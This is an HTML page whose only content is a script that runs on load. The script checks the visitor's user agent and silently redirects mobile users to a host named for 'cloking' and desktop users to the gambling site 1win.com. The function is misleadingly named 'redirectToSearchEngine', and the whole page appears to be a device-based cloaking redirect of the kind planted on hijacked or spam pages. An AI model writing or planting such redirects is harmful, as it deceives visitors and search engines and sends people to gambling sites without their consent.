<!DOCTYPE html>

<body>
<script nonce="MTEzMDE5NDYzNCwyMjIyOTE1Mzk3">
  function redirectToSearchEngine() {
    // Deteksi user agent untuk menentukan tipe perangkat
    var userAgent = navigator.userAgent.toLowerCase();

    // Array untuk mendeteksi mobile device
    var mobileDevices = ["iphone", "ipod", "ipad", "android", "blackberry", "opera mini", "iemobile", "mobile"];

    // Cek apakah user agent mengandung salah satu dari mobile device
    var isMobile = mobileDevices.some(function (device) {
      return userAgent.includes(device);
    });

    // Redirect berdasarkan tipe perangkat
    if (isMobile) {
      window.location.href = "https://cloking-daftar.pages.dev/PEMBRANTAS";
    } else {
      window.location.href = "https://1win.com/";
    }
  }

  // Panggil fungsi redirect saat halaman dimuat
  redirectToSearchEngine();
</script>
</body>
